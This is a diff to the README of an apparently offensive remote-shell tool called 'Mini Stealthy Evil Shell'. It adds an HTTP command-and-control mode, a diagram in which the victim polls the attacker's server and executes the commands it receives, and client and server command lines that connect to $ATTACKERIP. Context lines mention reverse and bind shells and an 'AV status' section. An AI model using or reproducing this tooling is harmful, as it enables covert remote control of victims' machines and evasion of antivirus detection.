@@ -5,11 +5,13 @@ Mini Stealthy Evil Shell
 - Reverse Shell
     - [x] TCP
     - [x] UDP
-    - [ ] HTTP/S
-    - [ ] ICMP
 - Bind Shell
     - [x] TCP
     - [x] UDP
+- HTTP shell
+    - [ ] Synchronous
+    - [x] Asynchronous
+    - [ ] TLS
 - Others
     - [ ] IPv6
     - [ ] Encryption
@@ -38,6 +40,27 @@ Mini Stealthy Evil Shell
 |       ./nd -l 1234 |            | nc 10.1.1.2 1234   |
 |                    |            |                    |
 +--------------------+            +--------------------+
+```
+
+## HTTP shell
+### Asynchronous
+```
++-------------------------+                 +------------------------+
+|victim                   |                 |attacker                |
+|http client              |                 |http server             |
+|                         |                 |                        |
+|                         |   find command  |                        |
+|                         +----------------->                        |
+|            execute <----+                 |                        |
+|                         +----------------->                        |
+|                         |    response     |                        |
+|                         |                 |                        |
+|                         |                 |                        |
++-------------------------+                 +------------------------+
+```
+```bash
+./nd -async -m http -server # server
+./nd -host $ATTACKERIP -port $ATTACKERPORT -async -m http # client
 ```
 
 ## AV status
